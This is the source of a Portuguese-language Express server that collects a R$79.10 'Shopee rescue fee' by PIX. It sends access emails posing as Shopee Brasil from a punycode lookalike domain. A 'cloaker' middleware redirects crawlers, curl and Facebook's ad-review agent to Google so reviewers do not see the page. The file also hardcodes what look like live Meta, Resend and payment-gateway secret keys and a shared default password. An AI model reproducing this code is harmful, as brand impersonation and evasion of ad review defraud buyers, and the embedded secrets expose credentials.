import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend';
import crypto from 'crypto';

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// 🛡️ CAMADA DE BLINDAGEM (CLOAKER GRATUITO)
// =====================================================
app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const blacklist = [
        'headless', 'ahrefs', 'semrush', 'python', 'curl', 
        'wget', 'spy', 'adspy', 'facebookexternalhit', 'bot', 'crawler'
    ];
    const isBot = blacklist.some(bot => ua.includes(bot));
    if (isBot) { return res.redirect('https://www.google.com'); }
    next();
});

// =====================================================
// CONFIGURAÇÃO: META ADS (PIXEL & CAPI)
// =====================================================
const META_PIXEL_ID = "847728461631550"; 
const META_ACCESS_TOKEN = "EAAGZAoNPRbbwBQlVq2XIPxcm6S3lE7EHASXNsyQoiULVOBES9uwoBt1ijXLIsS19daREz2xzuLnMl0C1yZAE3HYkKK19Fmykttzdhs5qZCZC0TkCviGXSrS9NuGvb99ZBDYZB8dkEzjlp6sZBrnG8x79dvvpV55mDhVXTocILMBbuxZCASrUZCIdUr18mYTZB0fgZDZD";

function hashData(data: string): string {
    if (!data) return '';
    return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
}

async function enviarCompraMeta(email: string, nome: string, valor: number) {
    try {
        await axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
            data: [{
                event_name: "Purchase",
                event_time: Math.floor(Date.now() / 1000),
                action_source: "website",
                user_data: {
                    em: [hashData(email)],
                    fn: [hashData(nome)]
                },
                custom_data: {
                    value: valor,
                    currency: "BRL"
                }
            }],
            access_token: META_ACCESS_TOKEN
        });
        console.log("🎯 Evento de Compra enviado ao Meta Ads com Sucesso!");
    } catch (error: any) {
        console.error("❌ Erro Meta Ads (Purchase)");
    }
}

async function enviarInitiateCheckoutMeta(email: string, nome: string) {
    try {
        await axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
            data: [{
                event_name: "InitiateCheckout",
                event_time: Math.floor(Date.now() / 1000),
                action_source: "website",
                user_data: {
                    em: [hashData(email)],
                    fn: [hashData(nome)]
                },
                custom_data: {
                    currency: "BRL",
                    value: 79.10 
                }
            }],
            access_token: META_ACCESS_TOKEN
        });
        console.log("🚀 Evento InitiateCheckout enviado ao Meta Ads com Sucesso!");
    } catch (error: any) {
        console.error("❌ Erro Meta Ads (InitiateCheckout)");
    }
}

// =====================================================
// 🚀 NOTIFICAÇÃO VIZION (DEFINA OS VALORES ABAIXO)
// =====================================================
async function avisarSociosVizion(nome: string) {
    // ABAIXO VOCÊ DEFINE O LINK E O VALOR PARA CADA UM
    const notificacoes = [
        { link: "LINK_AQUI", valor: "VALOR_AQUI" },
        { link: "LINK_AQUI", valor: "VALOR_AQUI" },
        { link: "LINK_AQUI", valor: "VALOR_AQUI" }
    ];

    for (const item of notificacoes) {
        if (item.link.includes("http")) {
            try {
                await axios.post(item.link, {
                    event: "venda_aprovada",
                    valor: item.valor,
                    produto: "Taxa de Resgate Shopee",
                    cliente: nome,
                    plataforma: "Sistema Próprio"
                });
                console.log(`📢 Vizion Notificado: R$ ${item.valor}`);
            } catch (e) {
                console.error("❌ Erro ao avisar um link da Vizion");
            }
        }
    }
}

// =====================================================
// CONFIGURAÇÃO: RESEND (E-MAIL DE ACESSO)
// =====================================================
const resend = new Resend('re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez');

async function enviarAcessoCurso(emailCliente: string, nomeCliente: string) {
    try {
        await resend.emails.send({
            from: 'Suporte Shopee <contato@xn--seubnushopp-5eb.com>',
            to: emailCliente,
            subject: 'Seu acesso chegou! 🚀 Resgate de Bonificação Shopee',
            html: `
                <div style="font-family: sans-serif; max-width: 600px; border: 1px solid #eee; padding: 20px; border-radius: 10px;">
                    <h2 style="color: #333;">Olá, ${nomeCliente}! 🎉</h2>
                    <p style="font-size: 16px; color: #555;">Sua bonificação foi processada com sucesso e seu acesso já está liberado.</p>
                    <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 25px 0; border: 1px solid #ddd;">
                        <h3 style="margin-top: 0; color: #ee4d2d; font-size: 18px;">🔑 Seus Dados de Acesso:</h3>
                        <p style="margin: 10px 0; font-size: 16px;"><strong>Login (E-mail):</strong> ${emailCliente}</p>
                        <p style="margin: 10px 0; font-size: 16px;"><strong>Senha:</strong> shopee123</p>
                    </div>
                    <div style="text-align: center; margin: 30px 0;">
                        <a href="https://rodrigo-gato-ribeiro.memberkit.com.br/" 
                           style="background: #ee4d2d; color: white; padding: 18px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block;">
                            ACESSAR MEU PAINEL AGORA
                        </a>
                    </div>
                    <p style="font-size: 12px; color: #999; margin-top: 15px;">Equipe de Liberação | Shopee Brasil</p>
                </div>
            `
        });
        console.log("📧 E-mail oficial enviado para: " + emailCliente);
    } catch (error: any) {
        console.error("❌ Erro Resend");
    }
}

// =====================================================
// 🔴 CHAVES VIZZION PAY
// =====================================================
const SECRET_KEY = "e08f7qe1x8zjbnx4dkra9p8v7uj1wfacwidsnnf4lhpfq3v8oz628smahn8g6kus"; 
const PUBLIC_KEY = "rodrigogato041_glxgrxj8x8yy8jo2";

const bancoTransacoes = new Map();

app.use(express.static(path.resolve())); 
app.get('/', (req, res) => {
    res.sendFile(path.resolve('index.html'));
});

const formatCpf = (v: string) => v.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
const formatPhone = (v: string) => v.replace(/\D/g, '').replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");

function acharCopiaECola(obj: any): string | null {
    if (typeof obj === 'string' && obj.startsWith('000201')) return obj;
    if (typeof obj === 'object' && obj !== null) {
        for (const key in obj) {
            const result = acharCopiaECola(obj[key]);
            if (result) return result;
        }
    }
    return null;
}

// =====================================================
// ROTA 1: GERA O PIX
// =====================================================
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor, origem } = req.body;
        const valorFixo = parseFloat(valor) || 79.10; 
        const identifier = `ID${Date.now()}`;
        const amanha = new Date();
        amanha.setDate(amanha.getDate() + 1);
        const dueDateStr = amanha.toISOString().split('T')[0];

        const payload = {
            identifier: identifier,
            amount: valorFixo,
            client: { 
                name: name || "Cliente", 
                email: email || "cliente@email.com", 
                phone: formatPhone(phone || "11999999999"), 
                document: formatCpf(cpf || "00000000000") 
            },
            products: [{ id: "TAXA_01", name: "Taxa de Liberação", quantity: 1, price: valorFixo }],
            dueDate: dueDateStr,
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        bancoTransacoes.set(identifier, { 
            status: 'pending', 
            amount: valorFixo,
            emailCliente: payload.client.email,
            nomeCliente: payload.client.name,
            origem: origem || 'direto'
        });

        await enviarInitiateCheckoutMeta(payload.client.email, payload.client.name);

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 'x-public-key': PUBLIC_KEY, 'x-secret-key': SECRET_KEY, 'Content-Type': 'application/json' }
        });

        const codigoPix = acharCopiaECola(response.data);

        console.log("✅ PIX GERADO!");
        console.log(`📢 Origem: ${origem || 'direto'}`);
        console.log(`👤 Cliente: ${name}`);

        return res.json({ 
            success: true, 
            payload: codigoPix, 
            transactionId: identifier 
        });
    } catch (error: any) {
        return res.status(401).json({ success: false, message: `Erro Vizzion` });
    }
});

// =====================================================
// ROTA 2: WEBHOOK (AQUI DISPARA TUDO)
// =====================================================
app.post('/webhook', async (req, res) => {
    const { event, transaction } = req.body;
    if (!transaction) return res.status(400).send("Invalid payload");

    const { identifier, status, paymentMethod, amount } = transaction;

    if (paymentMethod === 'PIX' && status === 'COMPLETED' && event === 'TRANSACTION_PAID') {
        if (bancoTransacoes.has(identifier)) {
            const transacao = bancoTransacoes.get(identifier);
            
            bancoTransacoes.set(identifier, { ...transacao, status: 'paid' });
            
            console.log(`💰 VENDA CONFIRMADA!`);

            // 1. Meta Ads
            await enviarCompraMeta(transacao.emailCliente, transacao.nomeCliente, Number(amount));
            
            // 2. E-mail Resend
            await enviarAcessoCurso(transacao.emailCliente, transacao.nomeCliente);

            // 3. Notificar Sócios Vizion
            await avisarSociosVizion(transacao.nomeCliente);
        }
    }
    return res.status(200).send("OK");
});

app.get('/check-status/:id', (req, res) => {
    const id = req.params.id;
    const transacao = bancoTransacoes.get(id);
    return res.json({ paid: transacao && transacao.status === 'paid' });
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Servidor Pronto!"));
